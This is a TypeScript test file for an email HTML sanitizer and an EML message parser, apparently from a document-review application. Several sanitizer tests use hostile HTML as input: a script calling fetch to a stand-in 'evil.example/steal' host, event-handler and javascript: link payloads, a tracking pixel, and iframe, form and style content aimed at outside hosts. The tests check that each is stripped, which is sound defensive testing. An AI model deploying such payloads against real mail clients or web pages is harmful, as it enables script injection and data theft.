import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeEmailHtml, htmlToText } from '../../server/lib/sanitizeHtml.ts';
import { parseEml, parseAddresses, looksLikeOutlookMsg, EmlError } from '../../server/lib/eml.ts';

// Sanitizer ------------------------------------------------------------

test('a script in an email body never survives, and neither does its text', () => {
  const out = sanitizeEmailHtml('<p>Before</p><script>fetch("https://evil.example/steal")</script><p>After</p>');
  assert.ok(!out.html.includes('script'));
  assert.ok(!out.html.includes('evil.example'), 'the script body is dropped whole, not escaped into the page');
  assert.ok(out.html.includes('Before') && out.html.includes('After'));
  assert.equal(out.blockedActiveContent, true);
});

test('an event handler attribute is removed while the element it was on stays readable', () => {
  const out = sanitizeEmailHtml('<p onclick="alert(1)" onmouseover="alert(2)">Read me</p>');
  assert.ok(!out.html.includes('onclick') && !out.html.includes('onmouseover'));
  assert.ok(out.html.includes('Read me'));
  assert.equal(out.blockedActiveContent, true);
});

test('a javascript: link is refused, an https: link is kept and cannot reach back', () => {
  const bad = sanitizeEmailHtml('<a href="javascript:alert(1)">click</a>');
  assert.ok(!bad.html.includes('javascript:'));
  assert.equal(bad.blockedActiveContent, true);
  assert.ok(bad.html.includes('click'), 'the words stay even when the link does not');

  const good = sanitizeEmailHtml('<a href="https://www.marines.mil/">the order</a>');
  assert.ok(good.html.includes('href="https://www.marines.mil/"'));
  assert.match(good.html, /rel="noopener noreferrer nofollow"/);
  assert.match(good.html, /target="_blank"/);
});

test('a remote image is blocked, because loading it tells the sender when the mail was opened', () => {
  const out = sanitizeEmailHtml('<p>Hello</p><img src="https://tracker.example/pixel.gif?id=abc" width="1" height="1">');
  assert.ok(!out.html.includes('tracker.example'));
  assert.equal(out.blockedRemoteImages, true);
  assert.match(out.html, /image blocked/);
});

test('an inline data image is kept, because its bytes are already in the message', () => {
  const src = 'data:image/png;base64,iVBORw0KGgo=';
  const out = sanitizeEmailHtml(`<img src="${src}" alt="a chart">`);
  assert.ok(out.html.includes(src));
  assert.ok(out.html.includes('a chart'));
  assert.equal(out.blockedRemoteImages, false);
});

test('style, iframe and form content are dropped whole', () => {
  const out = sanitizeEmailHtml('<style>body{background:url(https://x.example/y)}</style><iframe src="https://x.example"></iframe><form action="https://x.example"><input name="password"></form><p>ok</p>');
  assert.ok(!out.html.includes('x.example'));
  assert.ok(!out.html.includes('password'));
  assert.ok(out.html.includes('ok'));
  assert.equal(out.blockedActiveContent, true);
});

test('a conditional comment cannot smuggle markup through', () => {
  const out = sanitizeEmailHtml('<!--[if mso]><script>bad()</script><![endif]--><p>visible</p>');
  assert.ok(!out.html.includes('bad()'));
  assert.ok(out.html.includes('visible'));
});

test('unclosed and mis-nested tags come back as well-formed markup', () => {
  const out = sanitizeEmailHtml('<div><p>one<div><strong>two');
  assert.equal((out.html.match(/<div>/g) || []).length, (out.html.match(/<\/div>/g) || []).length);
  assert.equal((out.html.match(/<strong>/g) || []).length, (out.html.match(/<\/strong>/g) || []).length);
});

test('an inline style is dropped, so an email cannot repaint the page around it', () => {
  const out = sanitizeEmailHtml('<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff">covering</p>');
  assert.ok(!out.html.includes('style='));
  assert.ok(out.html.includes('covering'));
});

test('ordinary formatting an email actually uses is preserved', () => {
  const out = sanitizeEmailHtml('<p><strong>Subject:</strong> ULO review</p><table><tr><th scope="col">Doc</th><td colspan="2">ULO-1</td></tr></table><ul><li>one</li></ul>');
  assert.ok(out.html.includes('<strong>'));
  assert.ok(out.html.includes('<table>'));
  assert.ok(out.html.includes('colspan="2"'));
  assert.ok(out.html.includes('<li>'));
  assert.equal(out.blockedActiveContent, false);
});

test('plain text falls out of HTML readably', () => {
  assert.equal(htmlToText('<p>Line one</p><p>Line two</p>'), 'Line one\n\nLine two');
  assert.equal(htmlToText('<p>a &amp; b</p>'), 'a & b');
  assert.ok(!htmlToText('<script>secret()</script><p>shown</p>').includes('secret'));
});

// EML ------------------------------------------------------------------

const eml = (lines: string[]) => Buffer.from(lines.join('\r\n'), 'utf8');

test('a simple message yields its headers, addresses and body', () => {
  const parsed = parseEml(eml([
    'Message-ID: <abc123@example.mil>',
    'Date: Tue, 12 May 2026 14:03:00 -0400',
    'From: "Rivera, Ana" <ana.rivera@example.mil>',
    'To: vendor@contractor.example, "Nguyen, Bao" <bao.nguyen@example.mil>',
    'Cc: g8@example.mil',
    'Subject: Supporting document for ULO-0264',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'Please send the signed receiving report for ULO-0264.',
    '',
    'Very respectfully,',
    'Rivera',
  ]));
  assert.equal(parsed.messageId, 'abc123@example.mil');
  assert.equal(parsed.subject, 'Supporting document for ULO-0264');
  assert.deepEqual(parsed.from, { name: 'Rivera, Ana', email: 'ana.rivera@example.mil' });
  assert.deepEqual(parsed.to.map((a) => a.email), ['vendor@contractor.example', 'bao.nguyen@example.mil']);
  assert.deepEqual(parsed.cc.map((a) => a.email), ['g8@example.mil']);
  assert.match(parsed.text, /signed receiving report/);
  assert.ok(parsed.date?.startsWith('2026-05-12'));
});

test('a multipart message gives both the text and the HTML alternative', () => {
  const parsed = parseEml(eml([
    'From: sender@example.mil',
    'Subject: Two parts',
    'Content-Type: multipart/alternative; boundary="XYZ"',
    '',
    '--XYZ',
    'Content-Type: text/plain; charset=utf-8',
    '',
    'the plain version',
    '--XYZ',
    'Content-Type: text/html; charset=utf-8',
    '',
    '<p>the <b>html</b> version</p>',
    '--XYZ--',
    '',
  ]));
  assert.match(parsed.text, /the plain version/);
  assert.match(parsed.html, /<b>html<\/b>/);
});

test('quoted-printable and base64 bodies decode, including non-ASCII', () => {
  const qp = parseEml(eml([
    'From: a@b.mil', 'Subject: QP', 'Content-Type: text/plain; charset=utf-8', 'Content-Transfer-Encoding: quoted-printable', '',
    'Total was =E2=82=AC1,200 =\r\nand rising',
  ]));
  assert.match(qp.text, /€1,200 and rising/);

  const b64 = parseEml(eml([
    'From: a@b.mil', 'Subject: B64', 'Content-Type: text/plain; charset=utf-8', 'Content-Transfer-Encoding: base64', '',
    Buffer.from('decoded body text', 'utf8').toString('base64'),
  ]));
  assert.equal(b64.text.trim(), 'decoded body text');
});

test('an encoded subject reads as words, not as an encoding', () => {
  const parsed = parseEml(eml(['From: a@b.mil', 'Subject: =?UTF-8?B?UsOpc3Vtw6kgb2YgZnVuZGluZw==?=', '', 'body']));
  assert.equal(parsed.subject, 'Résumé of funding');
});

test('a folded header is read as one value', () => {
  const parsed = parseEml(eml([
    'From: a@b.mil',
    'Subject: A subject that continues',
    '  onto the next line',
    '', 'body',
  ]));
  assert.equal(parsed.subject, 'A subject that continues onto the next line');
});

test('an attachment is recorded by name, type, size and hash, and its bytes are not kept', () => {
  const payload = Buffer.from('%PDF-1.4 pretend receiving report', 'utf8');
  const parsed = parseEml(eml([
    'From: a@b.mil', 'Subject: With an attachment', 'Content-Type: multipart/mixed; boundary="M"', '',
    '--M', 'Content-Type: text/plain', '', 'see attached',
    '--M', 'Content-Type: application/pdf; name="receiving-report.pdf"', 'Content-Disposition: attachment; filename="receiving-report.pdf"', 'Content-Transfer-Encoding: base64', '',
    payload.toString('base64'),
    '--M--', '',
  ]));
  assert.equal(parsed.attachments.length, 1);
  assert.equal(parsed.attachments[0].filename, 'receiving-report.pdf');
  assert.equal(parsed.attachments[0].contentType, 'application/pdf');
  assert.equal(parsed.attachments[0].sizeBytes, payload.length);
  assert.equal(parsed.attachments[0].sha256.length, 64);
  assert.ok(!JSON.stringify(parsed).includes('pretend receiving report'), 'attachment bytes never travel with the parsed message');
});

test('the reply chain headers are kept, so a thread is joined by identity rather than by subject', () => {
  const parsed = parseEml(eml([
    'From: a@b.mil', 'Subject: Re: ULO-0264', 'Message-ID: <second@x>', 'In-Reply-To: <first@x>', 'References: <root@x> <first@x>', '', 'reply body',
  ]));
  assert.equal(parsed.inReplyTo, 'first@x');
  assert.deepEqual(parsed.references, ['root@x', 'first@x']);
});

test('a file that is not an email fails as a value with a message a person can act on', () => {
  assert.throws(() => parseEml(Buffer.from('just some text with no headers at all')), (e: Error) => e instanceof EmlError);
  assert.throws(
    () => parseEml(eml(['X-Random: 1', 'Y-Random: 2', '', 'body'])),
    (e: Error) => e instanceof EmlError && /saved email/i.test(e.message),
  );
});

test('an Outlook .msg is recognised so the message can say what to do instead', () => {
  const ole = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(32)]);
  assert.equal(looksLikeOutlookMsg(ole), true);
  assert.equal(looksLikeOutlookMsg(Buffer.from('From: a@b.mil\r\n\r\nbody')), false);
});

test('address parsing handles a comma inside a display name', () => {
  const parsed = parseAddresses('"Boletz, John" <john@example.mil>, plain@example.mil');
  assert.deepEqual(parsed, [
    { name: 'Boletz, John', email: 'john@example.mil' },
    { name: null, email: 'plain@example.mil' },
  ]);
});

test('a message body carrying hostile HTML is safe once sanitized', () => {
  const parsed = parseEml(eml([
    'From: attacker@elsewhere.example', 'Subject: Please review', 'Content-Type: text/html; charset=utf-8', '',
    '<p onclick="steal()">Urgent</p><img src="https://tracker.example/p.gif"><script>steal()</script>',
  ]));
  const safe = sanitizeEmailHtml(parsed.html);
  assert.ok(!safe.html.includes('steal'));
  assert.ok(!safe.html.includes('tracker.example'));
  assert.equal(safe.blockedActiveContent, true);
  assert.equal(safe.blockedRemoteImages, true);
  assert.ok(safe.html.includes('Urgent'));
});
